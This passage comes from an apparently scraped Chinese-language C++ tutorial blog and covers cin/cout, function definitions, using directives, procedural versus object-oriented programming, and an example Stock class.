old.&quot; &lt;&lt; std::endl; return 0;&#125; cout 之所以能做到这一点，是因为 &lt;&lt; 运算符针对不同的数据类型进行了**重载 (Overloading)**（我们将在后续章节详细学习）。简单来说，就是为 &lt;&lt; 运算符定义了多个版本，每个版本知道如何处理特定类型的数据，并将它们转换为适合输出的字符序列。 2.3 其他C++语句本节将介绍更多C++语句，包括如何从用户那里获取输入，如何更灵活地使用 cout，并对C++的核心概念——类进行初步介绍。 2.3.1 使用cin与 cout 用于输出类似，cin 是 iostream 库中预定义的一个对象，代表标准输入流，通常连接到键盘。我们可以使用 cin 来读取用户输入的数据。 &gt;&gt; 运算符（提取运算符）用于从 cin 对象获取数据，并将其存储到变量中。 用法与示例: 1234567891011121314151617181920212223242526#include &lt;iostream&gt; // 必须包含 iostream 以使用 cin 和 coutint main() &#123; int carrots; // 声明一个整型变量来存储输入 std::cout &lt;&lt; &quot;How many carrots do you have?&quot; &lt;&lt; std::endl; // 提示用户输入 std::cin &gt;&gt; carrots; // 从键盘读取一个整数，并存储到 carrots 变量中 std::cout &lt;&lt; &quot;Here are two more. &quot;; carrots = carrots + 2; // 对变量进行操作 // 输出结果 std::cout &lt;&lt; &quot;Now you have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; // 读取其他类型的数据 double price; std::cout &lt;&lt; &quot;Enter the price per carrot: &quot;; std::cin &gt;&gt; price; // 读取一个浮点数 std::cout &lt;&lt; &quot;The total cost for &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots is: &quot; &lt;&lt; carrots * price &lt;&lt; std::endl; return 0;&#125; #include &lt;iostream&gt;: 使用 cin 同样需要包含此头文件。 std::cin: cin 对象也位于 std 名称空间中。 cin &gt;&gt; variable;: 提取运算符 &gt;&gt; 从输入流（键盘）中读取数据，并根据 variable 的类型进行解释，然后将值存入 variable。cin 也会根据读取的数据类型自动进行转换。 输入分隔: cin 通常使用空白（空格、制表符、换行符）来分隔不同的输入项。例如，如果程序期望读取两个整数 cin &gt;&gt; a &gt;&gt; b;，用户可以输入 10 20 然后按 Enter，或者输入 10 按 Enter 再输入 20 按 Enter。 2.3.2 使用cout进行拼接我们在前面已经看到如何使用 cout 和插入运算符 &lt;&lt; 输出单个值或字符串。cout 的一个便捷之处在于，你可以在一条语句中连续使用 &lt;&lt; 运算符，将多个输出项“拼接”在一起。这称为**链式输出 (Chaining Output)**。 用法与示例: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt; // 包含 string 类型int main() &#123; int age = 28; std::string name = &quot;Bob&quot;; double weight = 75.3; // 不使用拼接的写法 (多条语句) std::cout &lt;&lt; &quot;Name: &quot;; std::cout &lt;&lt; name; std::cout &lt;&lt; &quot;, Age: &quot;; std::cout &lt;&lt; age; std::cout &lt;&lt; &quot;, Weight: &quot;; std::cout &lt;&lt; weight; std::cout &lt;&lt; std::endl; // 使用拼接的写法 (单条语句，更简洁) std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; &quot;, Age: &quot; &lt;&lt; age &lt;&lt; &quot;, Weight: &quot; &lt;&lt; weight &lt;&lt; std::endl; // 拼接不同类型的数据 std::cout &lt;&lt; &quot;In 5 years, &quot; &lt;&lt; name &lt;&lt; &quot; will be &quot; &lt;&lt; (age + 5) &lt;&lt; &quot; years old.&quot; &lt;&lt; std::endl; return 0;&#125; cout &lt;&lt; item1 &lt;&lt; item2 &lt;&lt; item3;: cout 对象在处理完第一个 &lt;&lt; item1 后，会返回自身 (cout)，因此可以继续处理下一个 &lt;&lt; item2，以此类推。 这种链式调用使得将变量值、字符串字面量和表达式结果组合输出变得非常方便和易读。 2.3.3 类简介类 (Class) 是C++的核心概念，也是面向对象编程（OOP）的基础。可以把类看作是创建对象 (Object) 的蓝图或模板。 封装 (Encapsulation): 类将数据（称为成员变量或属性）和操作这些数据的函数（称为成员函数或方法）捆绑在一起。 抽象 (Abstraction): 类提供了一个接口（通过其公有成员函数），隐藏了内部实现的复杂细节。 我们已经在使用类的对象了！cout 和 cin 就是 C++ 标准库中定义的类的对象： cout 是 ostream 类（输出流类）的一个对象。 cin 是 istream 类（输入流类）的一个对象。 ostream 类定义了如何处理输出，包括 &lt;&lt; 运算符如何针对不同数据类型工作。istream 类定义了如何处理输入，包括 &gt;&gt; 运算符如何读取数据。 概念理解: 想象一下 “汽车” 这个类： 数据/属性 (成员变量): 颜色、品牌、型号、当前速度、油量等。 操作/行为 (成员函数): 启动()、加速()、刹车()、鸣笛()、获取当前速度() 等。 根据这个 “汽车” 类，我们可以创建具体的对象，比如 “我的蓝色丰田卡罗拉” 或 “邻居的红色法拉利”。每个对象都有自己的属性值（不同的颜色、品牌等），但它们都共享类定义的行为（都可以启动、加速、刹车）。 示例 (概念性，非完整代码): 123456789101112131415161718// 这是一个非常简化的概念展示，不是完整的 C++ 类定义class Car &#123;public: // 公有接口，外部可以访问 void startEngine(); // 成员函数声明 void accelerate(int amount); void displayInfo(); private: // 私有数据，外部不能直接访问，只能通过成员函数 std::string color; std::string brand; int currentSpeed;&#125;;// ... 在程序的其他地方 ...// Car myCar; // 创建一个 Car 类的对象 (需要构造函数等，此处省略)// myCar.startEngine(); // 调用对象的成员函数// myCar.accelerate(50);// myCar.displayInfo(); 在后续章节中，我们将深入学习如何定义和使用自己的类。目前，只需理解类是定义数据和相关操作的一种方式，而对象是类的具体实例，cout 和 cin 就是我们已经接触到的对象实例。 2.4 函数函数是C++程序的构建块，它们是执行特定任务的命名代码段。使用函数可以使程序模块化、更易于理解和维护。本节将介绍如何使用和定义函数。 2.4.1 使用有返回值的函数许多C++函数会执行一个操作并返回一个值给调用它的代码。这种函数被称为**有返回值的函数 (Function with Return Value)**。 我们已经使用过一些有返回值的函数，例如 C++ 标准库 &lt;cmath&gt; (或 C 语言的 &lt;math.h&gt;) 中提供的 sqrt() 函数，它计算一个数的平方根并返回结果。 使用方法: 包含头文件: 确保包含了提供该函数声明的头文件（例如 &lt;cmath&gt;）。 函数调用: 使用函数名，并在括号 () 内提供所需的**参数 (Argument)**（传递给函数的值）。 处理返回值: 函数调用本身就是一个表达式，其值就是函数的返回值。可以将这个返回值赋给变量、用在更复杂的表达式中或直接输出。 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;cmath&gt; // 包含 cmath 头文件以使用 sqrt() 函数int main() &#123; double area; std::cout &lt;&lt; &quot;Enter the floor area, in square feet, of your home: &quot;; std::cin &gt;&gt; area; // 读取用户输入的面积 // 调用 sqrt() 函数，并将参数 area 传递给它 // 函数的返回值 (area 的平方根) 被赋给变量 side double side = std::sqrt(area); std::cout &lt;&lt; &quot;That&#x27;s the equivalent of a square &quot; &lt;&lt; side &lt;&lt; &quot; feet to the side.&quot; &lt;&lt; std::endl; // 也可以直接在输出语句中使用返回值 std::cout &lt;&lt; &quot;The square root of 16 is: &quot; &lt;&lt; std::sqrt(16) &lt;&lt; std::endl; // 返回值可以用在表达式中 double hypotenuse = std::sqrt(3.0 * 3.0 + 4.0 * 4.0); // 计算直角三角形斜边 std::cout &lt;&lt; &quot;Hypotenuse of a 3-4 triangle: &quot; &lt;&lt; hypotenuse &lt;&lt; std::endl; return 0;&#125; std::sqrt(area): 这是一个函数调用。std::sqrt 是函数名，area 是传递给函数的参数。 double side = ...: sqrt() 函数返回一个 double 类型的值，这个值被用来初始化 side 变量。 2.4.2 函数变体函数可以有多种形式： 有参数，有返回值: 如 sqrt(double x)，接收一个 double 参数，返回一个 double 值。 无参数，有返回值: 例如，某些库函数可能读取系统时间并返回一个值，不需要用户提供参数。 有参数，无返回值: 这种函数执行一个操作（如打印到屏幕），但不需要返回任何计算结果。这种函数的返回类型通常声明为 void。我们将在 2.4.3 节看到例子。 无参数，无返回值: 执行一个固定的操作，不接受输入参数也不返回结果，返回类型也是 void。 示例 (概念性): 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;cstdlib&gt; // 为了 rand() 和 srand()#include &lt;ctime&gt; // 为了 time()// 示例 1: 有参数，有返回值 (我们将在 2.4.4 定义自己的)// double calculate_something(int input); // 示例 2: 无参数，有返回值int getRandomNumber() &#123; // 使用 C 标准库函数生成一个伪随机数 return std::rand() % 100; // 返回 0-99 之间的随机数&#125;// 示例 3: 有参数，无返回值 (我们将在 2.4.3 定义自己的)// void printMessage(std::string msg); // 示例 4: 无参数，无返回值void showStartupMessage() &#123; std::cout &lt;&lt; &quot;Program starting...&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;-------------------&quot; &lt;&lt; std::endl;&#125;int main() &#123; // 初始化随机数生成器 (通常只需一次) std::srand(std::time(0)); showStartupMessage(); // 调用无参数、无返回值的函数 int randomNumber = getRandomNumber(); // 调用无参数、有返回值的函数 std::cout &lt;&lt; &quot;Random number: &quot; &lt;&lt; randomNumber &lt;&lt; std::endl; // 调用其他类型的函数 (假设已定义) // printMessage(&quot;Processing data...&quot;); // double result = calculate_something(10); // std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; 2.4.3 用户定义的函数除了使用库函数，我们还可以定义自己的函数来执行特定任务。这有助于组织代码和重用代码。 定义函数的基本结构: 123456returnType functionName(parameterList) &#123; // 函数体: 包含执行任务的语句 // ... // 如果 returnType 不是 void，则需要 return 语句返回一个值&#125; returnType: 函数执行完毕后返回的数据类型。如果函数不返回值，则使用 void。 functionName: 你为函数选择的名称。 parameterList: 函数接受的参数列表，包括每个参数的类型和名称。如果没有参数，括号 () 仍然需要，但内部为空。 &#123; ... &#125;: 函数体，包含函数的代码。 函数原型 (Function Prototype): 在使用函数之前，编译器需要知道函数的接口（返回类型、名称、参数列表）。通常将函数原型放在 main() 函数之前或单独的头文件中。原型看起来像函数头，但以分号 ; 结尾，可以省略参数名。 1returnType functionName(parameterTypeList); // 函数原型 用法与示例 (定义一个无返回值的函数): 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// 函数原型 (声明)void cheers(int n); // 声明 cheers 函数接受一个 int 参数，无返回值int main() &#123; std::cout &lt;&lt; &quot;Enter an integer: &quot;; int count; std::cin &gt;&gt; count; cheers(count); // 函数调用：将 count 的值传递给 cheers 函数 std::cout &lt;&lt; &quot;Done!&quot; &lt;&lt; std::endl; return 0;&#125;// 函数定义void cheers(int n) // 定义 cheers 函数，参数名为 n&#123; // 函数体 for (int i = 0; i &lt; n; i++) &#123; std::cout &lt;&lt; &quot;Cheers! &quot;; &#125; std::cout &lt;&lt; std::endl; // 因为返回类型是 void，所以不需要 return 语句返回值&#125; 原型: void cheers(int n); 告诉编译器 main 函数后面会定义一个名为 cheers 的函数。 调用: cheers(count); 执行 cheers 函数的代码，并将 count 的值复制给 cheers 函数的参数 n（这称为按值传递）。 定义: 提供了 cheers 函数的具体实现。 2.4.4 用户定义的有返回值的函数我们可以定义自己的函数来执行计算并返回结果。只需将 returnType 指定为期望的返回类型，并在函数体中使用 return 语句返回一个该类型的值。 用法与示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;// 函数原型: 声明 cube 函数接受一个 double 参数，返回一个 double 值double cube(double x); int main() &#123; double side; std::cout &lt;&lt; &quot;Enter the side length of a cube: &quot;; std::cin &gt;&gt; side; double volume = cube(side); // 调用 cube 函数，将返回值赋给 volume std::cout &lt;&lt; &quot;A cube with side &quot; &lt;&lt; side &lt;&lt; &quot; has a volume of &quot; &lt;&lt; volume &lt;&lt; &quot; cubic units.&quot; &lt;&lt; std::endl; // 也可以直接使用返回值 std::cout &lt;&lt; &quot;The cube of 2.5 is &quot; &lt;&lt; cube(2.5) &lt;&lt; std::endl; return 0;&#125;// 函数定义double cube(double x) &#123; // 函数体 double result = x * x * x; return result; // 返回计算结果 (类型必须与声明的返回类型 double 兼容) // 或者更简洁地： // return x * x * x; &#125; 原型: double cube(double x); 声明了函数的接口。 调用: cube(side) 调用函数，side 的值被传递给参数 x。函数执行后返回一个 double 值。 定义: double cube(double x) 提供了函数的实现。return result; 将计算出的立方值返回给调用者。 2.4.5 在多函数程序中使用using编译指令当程序包含多个函数时，每个函数都需要访问 std 名称空间中的元素（如 cout, cin, endl）。有几种处理方式： 在每个函数中都使用 std:: 前缀: 这是最安全的方式，尤其是在头文件中，但可能使代码冗长。 12345678void func1() &#123; std::cout &lt;&lt; &quot;Hello from func1\\n&quot;;&#125;void func2() &#123; int x; std::cin &gt;&gt; x; std::cout &lt;&lt; &quot;Input in func2: &quot; &lt;&lt; x &lt;&lt; std::endl;&#125; 在每个需要访问 std 的函数内部使用 using 声明或 using namespace std;: 这将 using 的作用域限制在函数内部，减少了命名冲突的风险。 123456789101112131415161718192021222324#include &lt;iostream&gt;void func1() &#123; using namespace std; // using 指令只在 func1 内部有效 cout &lt;&lt; &quot;Hello from func1\\n&quot;; &#125;void func2() &#123; using std::cin; // using 声明只引入 cin using std::cout; using std::endl; int x; cin &gt;&gt; x; cout &lt;&lt; &quot;Input in func2: &quot; &lt;&lt; x &lt;&lt; endl;&#125;int main() &#123; // 在 main 中也需要访问 std using namespace std; func1(); func2(); cout &lt;&lt; &quot;Back in main.&quot; &lt;&lt; endl; return 0;&#125; 在所有函数定义之前（通常是在所有 #include 之后）放置一个 using namespace std; 指令: 这使得文件中的所有后续代码都可以直接使用 std 中的名称，无需 std:: 前缀。这种方式最简单，但在大型项目中或编写头文件时不推荐，因为它可能引入全局命名冲突。 对于学习和小型项目，这通常是可接受的。 用法与示例 (全局 using 指令): 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;cmath&gt;// 将 using 指令放在所有函数之外using namespace std; // 函数原型void print_sqrt(double val);double get_input();int main() &#123; double number = get_input(); // 直接使用 get_input print_sqrt(number); // 直接使用 print_sqrt cout &lt;&lt; &quot;Program finished.&quot; &lt;&lt; endl; // 直接使用 cout 和 endl return 0;&#125;// 函数定义void print_sqrt(double val) &#123; if (val &lt; 0) &#123; cout &lt;&lt; &quot;Cannot calculate square root of a negative number.&quot; &lt;&lt; endl; &#125; else &#123; double root = sqrt(val); // 直接使用 sqrt (来自 cmath, 已在 std 中) cout &lt;&lt; &quot;The square root of &quot; &lt;&lt; val &lt;&lt; &quot; is &quot; &lt;&lt; root &lt;&lt; endl; &#125;&#125;double get_input() &#123; double input_val; cout &lt;&lt; &quot;Enter a number: &quot;; // 直接使用 cout cin &gt;&gt; input_val; // 直接使用 cin return input_val;&#125; 选择哪种方式取决于项目的规模和个人/团队的编码规范。对于初学者编写的简单多函数程序，将 using namespace std; 放在 #include 之后是一种常见的简化方法。 2.5 总结本章引导我们迈出了学习C++的第一步，涵盖了编写、编译和理解一个基本C++程序所需的 foundational concepts。 我们从C++程序的核心——main()函数开始，它是程序的入口点。了解了如何使用注释（// 和 /* */）来提高代码的可读性。接着，我们接触了C++预处理器，特别是 #include 指令，它用于包含头文件（如 &lt;iostream&gt;），这些头文件提供了函数和对象的声明。我们区分了标准库头文件（用 &lt;&gt;）和用户自定义头文件（用 &quot;&quot;）。 名称空间的概念被引入，特别是 std 名称空间，它包含了C++标准库的大部分内容。我们学习了访问 std 中元素的三种方式：使用 std:: 前缀、using 声明和 using 编译指令，并讨论了它们的适用场景和潜在风险。 我们重点学习了如何使用 iostream 库中的 cout 对象和插入运算符 &lt;&lt; 来显示各种类型的数据（字符串、整数、浮点数等），以及如何使用 endl 或 \\n 进行换行。代码格式化的重要性也被强调，以保证代码清晰、易于维护。 随后，我们学习了C++的基本语句类型。声明语句用于创建变量，指定其类型和名称，并可以选择在声明时进行初始化。赋值语句使用 = 运算符将值存储到变量中。我们还看到了 cout 如何智能地处理不同数据类型，以及如何通过链式调用 &lt;&lt; 来拼接输出。 输入操作通过 cin 对象和提取运算符 &gt;&gt; 实现，允许程序从用户那里读取数据并存储到变量中。 最后，我们初步探讨了函数。我们学习了如何调用库函数（如 &lt;cmath&gt; 中的 sqrt()）并使用它们的返回值。我们了解了函数的不同变体（有/无参数，有/无返回值）。更重要的是，我们学习了如何定义自己的函数，包括编写函数原型（声明）和函数定义（实现），以及如何通过函数调用来执行它们。我们还讨论了如何在包含多个函数的程序中管理 std 名称空间的使用。 通过本章的学习，我们已经能够编写简单的C++程序，实现基本的输入、处理和输出功能，并对C++程序的结构和一些核心概念有了初步的认识。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 10 对象和类","slug":"Cpp_tutorial_Chapter_10","date":"2025-04-26T12:03:35.399Z","updated":"2025-04-26T12:02:31.684Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_10/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_10/","excerpt":"","text":"10.1 过程性编程和面向对象编程在深入学习C++的类之前，了解两种主要的编程范式（Programming Paradigms）——过程性编程和面向对象编程——之间的区别是很有帮助的。C++ 语言同时支持这两种范式，但其强大的面向对象特性是其核心优势之一。 过程性编程 (Procedural Programming)过程性编程是最早期的编程范式之一，像C语言就是典型的过程性语言。它的核心思想是将程序看作是一系列要执行的过程或函数。 关注点： 主要关注点在于算法和执行步骤。程序被分解为一系列的函数调用。 数据处理： 数据通常是独立于函数存在的（例如全局变量），或者作为参数在函数之间传递。数据和操作数据的函数是分离的。 组织方式： 程序通过函数的层次结构来组织。一个主函数调用其他函数，这些函数又可能调用更底层的函数。 示例语言： C, Pascal, Fortran。 过程性编程的思维方式： “程序需要执行哪些步骤？需要哪些函数来实现这些步骤？” 例子（概念性）：假设要管理一个银行账户。在过程性方法中，你可能会有： 一个数据结构（比如 struct）来存储账户信息（账号、余额）。 一系列函数来操作这个数据结构：deposit(account, amount), withdraw(account, amount), check_balance(account)。 12345678910111213141516171819202122232425262728293031// C 语言示例 (过程性)struct BankAccount &#123; int accountNumber; double balance;&#125;;void deposit(struct BankAccount* acc, double amount) &#123; if (amount &gt; 0) &#123; acc-&gt;balance += amount; &#125;&#125;void withdraw(struct BankAccount* acc, double amount) &#123; if (amount &gt; 0 &amp;&amp; acc-&gt;balance &gt;= amount) &#123; acc-&gt;balance -= amount; &#125; else &#123; // 处理错误 &#125;&#125;double check_balance(struct BankAccount* acc) &#123; return acc-&gt;balance;&#125;int main() &#123; struct BankAccount myAccount = &#123;12345, 1000.0&#125;; deposit(&amp;myAccount, 500.0); withdraw(&amp;myAccount, 200.0); // ... return 0;&#125; 在这种模式下，数据（myAccount）和操作（deposit, withdraw）是分开定义的。 面向对象编程 (Object-Oriented Programming - OOP)面向对象编程（OOP）是一种不同的思考方式。它将程序看作是由相互交互的对象 (Objects) 组成的。 关注点： 主要关注点在于数据以及与数据相关的操作。程序的核心是对象。 对象： 对象是现实世界实体的抽象，它封装 (Encapsulates) 了数据（属性/状态）和可以对这些数据执行的操作（方法/行为）。 组织方式： 程序通过创建对象并让这些对象相互发送消息（调用方法）来组织。 核心概念： 封装 (Encapsulation): 将数据和操作数据的函数捆绑在一起（形成类），并对外部隐藏对象的内部实现细节（数据隐藏）。 继承 (Inheritance): 允许创建一个新类（派生类），该类继承现有类（基类）的属性和方法，从而实现代码重用和层次结构。 多态 (Polymorphism): 允许不同类的对象对相同的消息（方法调用）做出不同的响应。这通常通过虚函数实现。 抽象 (Abstraction): 关注对象的本质特征，忽略不重要的细节。类就是一种抽象。 示例语言： C++, Java, C#, Python, Smalltalk。 面向对象编程的思维方式： “程序涉及哪些‘事物’（对象）？每个‘事物’有哪些特征（数据）？它可以做什么（方法）？这些‘事物’之间如何交互？” 例子（概念性）：对于银行账户，OOP方法会创建一个 BankAccount 类： 数据成员（属性）： accountNumber, balance (通常设为私有 private，以实现数据隐藏)。 成员函数（方法）： deposit(amount), withdraw(amount), check_balance() (这些函数直接操作对象内部的数据)。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// C++ 示例 (面向对象)class BankAccount &#123;private: // 数据隐藏 int accountNumber; double balance;public: // 公共接口 // 构造函数 (用于创建对象) BankAccount(int accNum, double initialBalance) &#123; accountNumber = accNum; balance = (initialBalance &gt;= 0) ? initialBalance : 0.0; &#125; void deposit(double amount) &#123; if (amount &gt; 0) &#123; balance += amount; &#125; &#125; void withdraw(double amount) &#123; if (amount &gt; 0 &amp;&amp; balance &gt;= amount) &#123; balance -= amount; &#125; else &#123; // 处理错误 &#125; &#125; double check_balance() const &#123; // const 表示此方法不修改对象状态 return balance; &#125; int getAccountNumber() const &#123; return accountNumber; &#125;&#125;; // 注意类定义末尾的分号int main() &#123; // 创建 BankAccount 对象 BankAccount myAccount(12345, 1000.0); // 通过对象调用方法 myAccount.deposit(500.0); myAccount.withdraw(200.0); std::cout &lt;&lt; &quot;Balance: &quot; &lt;&lt; myAccount.check_balance() &lt;&lt; std::endl; return 0;&#125; 在这里，数据 (accountNumber, balance) 和操作 (deposit, withdraw, check_balance) 被紧密地捆绑在 BankAccount 类中。你通过 myAccount 这个对象来调用它的方法。 总结对比 特性 过程性编程 面向对象编程 (OOP) 核心 函数/过程 对象 (数据 + 方法) 数据 通常与函数分离 封装在对象内部 访问控制 有限 (主要靠作用域) 强 (public, private, protected) 主要优势 简单直接，适合小型或中型项目 模块化、重用性、可维护性、扩展性好 设计方法 自顶向下 (Top-down) 自底向上 (Bottom-up) 或混合 代码重用 主要通过函数库 主要通过继承和组合 适合场景 算法密集型、顺序执行任务 大型复杂系统、模拟、GUI C++ 最初是从 C 语言发展而来的，因此它完全兼容过程性编程。然而，C++ 的真正威力在于其强大的面向对象特性，它允许开发者构建更大型、更复杂、更易于维护和扩展的软件系统。接下来的章节将深入探讨 OOP 的核心——类和对象。 10.2 抽象和类面向对象编程（OOP）的核心思想之一是**抽象 (Abstraction)**。在编程中，抽象意味着关注事物的本质特征和行为，而忽略其不重要的内部细节。我们每天都在使用抽象：当你开车时，你只需要知道如何使用方向盘、油门和刹车（接口），而不需要了解引擎内部复杂的机械原理（实现细节）。 10.2.1 类型是什么在编程语言中，“类型”（Type）定义了一组可能的值以及可以对这些值执行的操作。 内置类型 (Built-in Types): C++ 提供了像 int, float, char, bool 这样的基本类型。我们知道 int 可以存储整数，并且可以对它们执行加、减、乘、除等运算。编译器知道如何表示这些类型的数据以及如何执行这些操作。 用户定义类型 (User-Defined Types - UDT): C++ 允许程序员创建自己的类型来模拟现实世界或特定问题域中的概念。这就是类 (Class) 发挥作用的地方。类是一种将数据（属性）和操作这些数据的函数（方法）捆绑在一起的机制，从而创建新的数据类型。 例如，如果你在编写一个股票交易程序，你可能需要一个表示“股票”的类型。这个类型应该包含哪些数据（如股票名称、持有数量、单价）？可以对它执行哪些操作（如购买、出售、更新价格、显示信息）？类允许你精确地定义这些。 10.2.2 C++中的类类是创建对象的蓝图或模板。它定义了： 数据成员 (Data Members): 对象将存储的数据（也称为属性、状态）。 成员函数 (Member Functions): 可以对对象的数据执行的操作（也称为方法、行为）。 类声明的基本语法: 123456789101112class ClassName &#123;private: // 私有数据成员和成员函数 // 通常将数据成员放在这里，实现数据隐藏public: // 公有数据成员和成员函数 // 这是类的公共接口，外部代码通过它们与对象交互protected: // 保护成员 (将在继承中讨论)&#125;; // 注意末尾的分号 class 关键字: 表明你正在定义一个类。 ClassName: 你为新类型指定的名称（遵循变量命名规则，通常首字母大写）。 访问说明符 (Access Specifiers): private: 私有成员只能被类的内部成员函数访问。这是实现数据隐藏 (Data Hiding) 的关键，保护数据不被外部代码随意修改，是封装的重要体现。默认情况下，类成员是 private 的。 public: 公有成员可以被程序中的任何地方访问（通过类的对象）。它们构成了类的**公共接口 (Public Interface)**。 protected: 与继承相关，现在可以暂时将其视为与 private 类似。 成员: 类定义的花括号 &#123;&#125; 内部声明的变量（数据成员）和函数（成员函数）。 示例：定义一个简单的 Stock 类 假设我们要创建一个表示股票持有的类。 1234567891011121314151617181920// 通常放在头文件 (e.g., stock.h) 中#include &lt;string&gt; // 为了使用 std::stringclass Stock &#123;private: // 数据成员通常是私有的 std::string company; long shares; double share_val; double total_val; // 一个私有辅助函数，只能在类内部调用 void set_tot() &#123; total_val = shares * share_val; &#125;public: // 成员函数通常是公有的，构成接口 // 函数原型 (声明) void acquire(const std::string &amp;co, long n, double pr); // 买入股票 void buy(long num, double price); // 增持股票 void sell(long num, double price); // 卖出股票 void update(double price); // 更新股价 void show() const; // 显示股票信息 (const表明此函数不修改对象)&#125;; // 类定义结束 这个 Stock 类定义了一个新的数据类型。它封装了股票相关的数据 (company, shares, share_val, total_val) 和操作这些数据的函数 (acquire, buy, sell, update, show)。数据成员被设为 private，外部代码不能直接访问它们，只能通过 public 的成员函数来交互。set_tot() 是一个内部辅助函数，也被设为 private。 10.2.3 实现类成员函数类定义通常只包含成员函数的声明（原型）。函数的定义（实现）可以放在类声明的内部（如果函数很简单，可以作为内联函数），或者更常见地，放在类声明的外部（通常在对应的源文件 .cpp 中）。 当在类外部定义成员函数时，你需要使用作用域解析运算符 :: 来指明这个函数属于哪个类。 语法: 123ReturnType ClassName::FunctionName(ParameterList) &#123; // 函数体&#125; 示例：实现 Stock 类的成员函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374// 通常放在源文件 (e.g., stock.cpp) 中#include &lt;iostream&gt;#include &quot;stock.h&quot; // 包含类定义的头文件// 使用作用域解析运算符 :: 指明函数属于 Stock 类void Stock::acquire(const std::string &amp;co, long n, double pr) &#123; company = co; if (n &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares can&#x27;t be negative; &quot; &lt;&lt; company &lt;&lt; &quot; shares set to 0.\\n&quot;; shares = 0; &#125; else &#123; shares = n; &#125; share_val = pr; set_tot(); // 调用私有成员函数计算总值&#125;void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares purchased can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares += num; share_val = price; // 假设按新价格计算 set_tot(); &#125;&#125;void Stock::sell(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares sold can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else if (num &gt; shares) &#123; std::cout &lt;&lt; &quot;You can&#x27;t sell more than you have! &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares -= num; share_val = price; // 假设按新价格计算 set_tot(); &#125;&#125;void Stock::update(double price) &#123; share_val = price; set_tot();&#125;// 注意 const 关键字在函数定义和声明中都要有void Stock::show() const &#123; // 设置输出格式 std::ios_base::fmtflags orig = std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); std::streamsize prec = std::cout.precision(3); std::cout &lt;&lt; &quot;Company: &quot; &lt;&lt; company &lt;&lt; &quot; Shares: &quot; &lt;&lt; shares &lt;&lt; &#x27;\\n&#x27;; std::cout &lt;&lt; &quot; Share Price: $&quot; &lt;&lt; share_val; // 设置精度为2位小数显示总价 std::cout.precision(2); std::cout &lt;&lt; &quot; Total Worth: $&quot; &lt;&lt; total_val &lt;&lt; &#x27;\\n&#x27;; // 恢复原始格式 std::cout.setf(orig, std::ios_base::floatfield); std::cout.precision(prec);&#125;// 注意：私有成员函数 set_tot() 也可以在类外部定义，// 但因为它很简单，通常会直接在类定义内部实现（如上所示），// 这样它就可能被编译器视为内联函数。// 如果在外部定义：// void Stock::set_tot() &#123;// total_val = shares * share_val;// &#125; const 成员函数:在 show() 函数声明和定义的末尾都有 const 关键字。这表明 show() 是一个常量成员函数，它承诺不会修改调用它的对象的数据成员。这是一个好习惯，可以提高代码的可读性和安全性，并允许对 const 对象调用此函数。 10.2.4 使用类一旦定义了类（蓝图），你就可以创建该类的对象 (Objects) 或**实例 (Instances)**。创建对象就像声明一个基本类型的变量一样。 123456789101112131415161718192021222324252627// 在 main() 函数或其他函数中#include &quot;stock.h&quot; // 需要包含类定义int main() &#123; // 创建两个 Stock 对象 (实例) Stock stock1; Stock stock2; // 使用点号 . (成员访问运算符) 调用对象的公有成员函数 stock1.acquire(&quot;NanoSmart&quot;, 20, 12.50); stock1.show(); // 显示 stock1 的信息 stock2.acquire(&quot;Boffo Objects&quot;, 2, 180.0); stock2.show(); // 显示 stock2 的信息 stock2.buy(5, 190.0); // 增持 stock2 stock2.show(); stock1.sell(10, 15.75); // 卖出部分 stock1 stock1.show(); // 错误！不能直接访问私有成员 // stock1.shares = 50; // 编译错误 // std::cout &lt;&lt; stock1.company; // 编译错误 return 0;&#125; Stock stock1; 创建了一个名为 stock1 的 Stock 类型的对象。 使用成员访问运算符（点号 .）来调用对象的公有成员函数，例如 stock1.acquire(...) 或 stock2.show()。 每个对象都有自己的一套数据成员。stock1 的 shares 和 stock2 的 shares 是相互独立的。 你不能从对象外部直接访问 private 成员，这强制你必须通过类提供的公共接口（public 函数）来与对象交互。 10.2.5 修改实现将类的接口（头文件中的声明）和实现（源文件中的定义）分开的一个主要好处是封装带来的灵活性。 接口 (Interface): 头文件 (stock.h) 定义了如何使用这个类（公共成员函数）。使用类的代码（如 main() 函数）只需要包含头文件。 实现 (Implementation): 源文件 (stock.cpp) 包含了成员函数具体如何工作。 只要类的公共接口保持不变（函数名、参数、返回类型不变），你就可以自由地修改源文件中的实现细节（例如，改进 set_tot 的计算方式，或者改变内部数据的存储方式），而不需要修改或重新编译使用该类的其他代码文件（如包含 main() 的文件）。只需要重新编译实现文件 (stock.cpp) 并重新链接即可。 这大大降低了维护成本，并使得代码库更容易更新和改进。用户只关心“能做什么”（接口），而不必关心“怎么做”（实现）。 10.2.6 小结 抽象是关注本质、忽略细节的编程思想。 类是C++实现抽象和创建用户定义类型的主要机制。 